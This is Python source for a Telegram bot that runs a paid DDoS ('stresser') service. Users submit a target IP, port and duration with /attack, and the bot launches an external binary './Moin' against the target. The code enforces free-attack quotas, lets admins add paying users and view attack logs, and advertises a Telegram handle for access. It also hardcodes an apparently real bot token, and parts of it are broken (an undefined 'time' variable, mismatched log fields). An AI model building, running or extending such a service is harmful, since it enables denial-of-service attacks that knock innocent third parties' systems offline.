import telebot
import sqlite3
import asyncio
from datetime import datetime, timedelta

# Insert your Telegram bot token here
bot = telebot.TeleBot('7743729316:AAFhCkGxOwYh1u0XJ_mlZ8KRjXEYIQZ4NnQ')

# Admin user IDs
ADMIN_IDS = ["6103581760"]

# Database setup
DB_FILE = "bot_data.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, attack_count INTEGER DEFAULT 0, subscription_expiry DATETIME)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, target TEXT, port INTEGER, duration INTEGER, timestamp DATETIME)''')
    conn.commit()
    conn.close()

init_db()

# Constants
FREE_ATTACK_LIMIT = 10

# Helper Functions
def get_user_data(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT attack_count, subscription_expiry FROM users WHERE user_id = ?", (user_id,))
    user_data = c.fetchone()
    conn.close()
    return user_data

def update_user_attack_count(user_id, count):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = ? WHERE user_id = ?", (count, user_id))
    conn.commit()
    conn.close()

def log_attack(user_id, target, port, duration):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, target, port, duration, timestamp) VALUES (?, ?, ?, ?, ?)",
              (user_id, target, port, duration, datetime.now()))
    conn.commit()
    conn.close()

def is_admin(user_id):
    return user_id in ADMIN_IDS

# Command Handlers
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    user_data = get_user_data(user_id)
    
    if user_data is None:
        bot.reply_to(message, "🚫 Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Bᴏᴛ.")
        return

    attack_count, subscription_expiry = user_data
    if attack_count >= FREE_ATTACK_LIMIT:
        bot.reply_to(message, "⚠️ Yᴏᴜ Hᴀᴠᴇ Rᴇᴀᴄʜᴇᴅ Yᴏᴜʀ Fʀᴇᴇ Aᴛᴛᴀᴄᴋ Lɪᴍɪᴛ. Pʟᴇᴀsᴇ Pᴜʀᴄʜᴀsᴇ Tᴏᴋᴇɴ Tᴏ Cᴏɴᴛɪɴᴜᴇ.")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usᴇɢ: /attack <Tᴀʀɢᴇᴛ> <Pᴏʀᴛ> <Dᴜʀᴀᴛɪᴏɴ>")
        return

    target, port, duration = command[1], int(command[2]), int(command[3])
    log_attack(user_id, target, port, duration)
    update_user_attack_count(user_id, attack_count + 1)
    
    asyncio.run(execute_attack(target, port, duration))
    bot.reply_to(message, f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @SIDIKI_MUSTAFA_47.")

async def execute_attack(target, port, duration):
    proc = await asyncio.create_subprocess_exec("./Moin", target, str(port), str(duration), "100")
    await proc.communicate()

@bot.message_handler(commands=['add'])
def handle_add_user(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫  Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ.")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /add <user_id>")
        return

    user_id = command[1]
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO users (user_id, attack_count, subscription_expiry) VALUES (?, ?, ?)", 
                  (user_id, 0, None))
        conn.commit()
        bot.reply_to(message, f"✅ Usᴇʀ {user_id} Aᴅᴅᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ.")
    except sqlite3.IntegrityError:
        bot.reply_to(message, "❌ Usᴇʀ Aʟʀᴇᴀᴅʏ Exɪsᴛ.")
    finally:
        conn.close()

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫 Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪsᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ.")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 10")
    logs = c.fetchall()
    conn.close()

    if logs:
        log_message = "\n".join([f"{log[4]} - {log[1]} attacked {log[2]}:{log[3]} for {log[4]} seconds" for log in logs])
        bot.reply_to(message, f"📝 Recent Logs:\n{log_message}")
    else:
        bot.reply_to(message, "⚠️ Nᴏ Lᴏɢs Aᴠᴀɪʟᴀʙʟᴇ.")

@bot.message_handler(commands=['resetattacks'])
def handle_reset_attacks(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫 Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /resetattacks <user_id>")
        return

    user_id = command[1]
    update_user_attack_count(user_id, 0)
    bot.reply_to(message, f"✅ Attack count reset for user {user_id}.")

@bot.message_handler(commands=['start'])
def welcome_message(message):
    bot.reply_to(message, "❄️ Wᴇʟᴄᴏᴍᴇ Tᴏ Tʜᴇ Pʀᴇᴍɪᴜᴍ Dᴅᴏs Bᴏᴛ. Usᴇ Tᴏ Vɪᴇᴡ Aᴠᴀɪʟᴀʙᴇʟ Cᴏᴍᴍᴀɴᴅs 𝐘𝐎𝐔𝐑 𝐂𝐎𝐌𝐌𝐀𝐌𝐃𝐒 /start\n/resetattacks\n/attack\n/add\n\n𝘿𝙈 -@SIDIKI_MUSTAFA_47 Fᴏʀ Aᴄᴄᴇss  ")

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")